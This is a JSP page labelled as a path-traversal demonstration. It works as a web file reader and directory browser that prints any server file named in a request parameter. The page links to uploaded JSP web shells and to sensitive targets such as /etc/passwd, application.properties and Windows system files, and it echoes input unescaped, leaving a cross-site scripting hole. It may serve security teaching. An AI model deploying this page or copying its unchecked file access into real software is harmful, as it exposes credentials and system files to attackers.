<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.nio.file.*" %>
<%@ page trimDirectiveWhitespaces="true" %>
<html>
<head>
    <title>Path Traversal File Reader</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f8f9fa; color: #212529; }
        pre { background-color: #f0f0f0; padding: 10px; border-radius: 5px; overflow-x: auto; }
        .container { max-width: 900px; margin: 0 auto; }
        .alert { padding: 15px; margin-bottom: 20px; border-radius: 4px; }
        .alert-danger { background-color: #f8d7da; color: #721c24; }
        input[type="text"] { width: 80%; padding: 8px; border: 1px solid #ced4da; border-radius: 4px; }
        input[type="submit"] { padding: 8px 15px; background-color: #dc3545; color: white; border: none; border-radius: 4px; cursor: pointer; }
        .file-list { margin-top: 20px; }
        .file-list ul { list-style-type: none; padding-left: 0; }
        .file-list li { padding: 5px 0; border-bottom: 1px solid #eee; }
        .file-list a { text-decoration: none; color: #0d6efd; }
        .file-list a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Path Traversal File Reader</h1>
        
        <div class="alert alert-danger">
            <strong>Warning:</strong> This is a demonstration of a path traversal vulnerability that allows reading uploaded files and any other files on the system.
        </div>
        
        <h3>1. Read Any File Using Path Traversal</h3>
        <form method="get">
            <div style="margin-bottom: 10px;">
                <input type="text" name="file" placeholder="Enter file path (e.g., ../../../etc/passwd or uploads/shell.jsp)" 
                       value="<%= request.getParameter("file") != null ? request.getParameter("file") : "" %>">
                <input type="submit" value="Read File">
            </div>
        </form>
        
        <% if(request.getParameter("file") != null) { %>
            <h3>File Contents:</h3>
            <pre><%
                try {
                    // Vulnerable: No path validation or sanitization
                    String filePath = request.getParameter("file");
                    
                    // Read the file directly without validation
                    // This allows path traversal attacks like "../../etc/passwd"
                    File file = new File(filePath);
                    
                    out.println("Reading file: " + file.getCanonicalPath());
                    out.println("-----------------------------------");
                    
                    if(file.exists() && file.isFile()) {
                        BufferedReader reader = new BufferedReader(new FileReader(file));
                        String line;
                        while((line = reader.readLine()) != null) {
                            out.println(line);
                        }
                        reader.close();
                    } else {
                        out.println("File not found or is not a regular file: " + filePath);
                    }
                } catch(Exception e) {
                    out.println("Error reading file: " + e.getMessage());
                }
            %></pre>
        <% } %>
        
        <h3>2. Browse Uploaded Files</h3>
        <div class="file-list">
            <%
                try {
                    // Default to the uploads directory
                    String uploadDir = "uploads";
                    
                    // Get directory parameter if provided (allows path traversal)
                    String dirPath = request.getParameter("dir");
                    if(dirPath != null && !dirPath.isEmpty()) {
                        uploadDir = dirPath;
                    }
                    
                    File dir = new File(uploadDir);
                    
                    out.println("<p>Current directory: " + dir.getCanonicalPath() + "</p>");
                    
                    if(dir.getParentFile() != null) {
                        out.println("<a href='?dir=" + dir.getParentFile().getCanonicalPath() + "'>[Parent Directory]</a>");
                    }
                    
                    out.println("<ul>");
                    File[] files = dir.listFiles();
                    if(files != null) {
                        Arrays.sort(files);
                        for(File file : files) {
                            if(file.isDirectory()) {
                                out.println("<li>üìÅ <a href='?dir=" + file.getCanonicalPath() + "'>" + file.getName() + "/</a></li>");
                            } else {
                                out.println("<li>üìÑ <a href='?file=" + file.getCanonicalPath() + "'>" + file.getName() + "</a> (" + (file.length() / 1024) + " KB)</li>");
                            }
                        }
                    }
                    out.println("</ul>");
                } catch(Exception e) {
                    out.println("<div class='alert alert-danger'>Error: " + e.getMessage() + "</div>");
                }
            %>
        </div>
        
        <h3>3. Common Paths to Try</h3>
        <ul>
            <li><a href="?file=uploads/shell.jsp">uploads/shell.jsp</a> - JSP Web Shell</li>
            <li><a href="?file=uploads/shell-path-traversal.jsp">uploads/shell-path-traversal.jsp</a> - Path Traversal Shell</li>
            <li><a href="?file=src/main/resources/application.properties">src/main/resources/application.properties</a> - Application Configuration</li>
            <li><a href="?file=src/main/java/com/atudw/demo/controller/fileupload/FileUploadController.java">src/main/java/com/atudw/demo/controller/fileupload/FileUploadController.java</a> - File Upload Controller</li>
            <li><a href="?file=pom.xml">pom.xml</a> - Maven Configuration</li>
            <li><a href="?file=C:/Windows/win.ini">C:/Windows/win.ini</a> - Windows System File (Windows)</li>
            <li><a href="?file=/etc/passwd">/etc/passwd</a> - User Accounts (Linux)</li>
        </ul>
        
        <h3>4. Path Traversal Attack Examples</h3>
        <table border="1" style="width: 100%; border-collapse: collapse; margin-top: 20px;">
            <tr>
                <th>Path Pattern</th>
                <th>Description</th>
                <th>Example</th>
            </tr>
            <tr>
                <td>../</td>
                <td>Move up one directory</td>
                <td><a href="?file=../pom.xml">../pom.xml</a></td>
            </tr>
            <tr>
                <td>../../</td>
                <td>Move up multiple directories</td>
                <td><a href="?file=../../">../../</a></td>
            </tr>
            <tr>
                <td>Absolute paths</td>
                <td>Access files using absolute paths</td>
                <td><a href="?file=C:/Windows/System32/drivers/etc/hosts">C:/Windows/System32/drivers/etc/hosts</a></td>
            </tr>
            <tr>
                <td>Application files</td>
                <td>Access sensitive application files</td>
                <td><a href="?file=src/main/resources/application.properties">src/main/resources/application.properties</a></td>
            </tr>
        </table>
    </div>
</body>
</html> 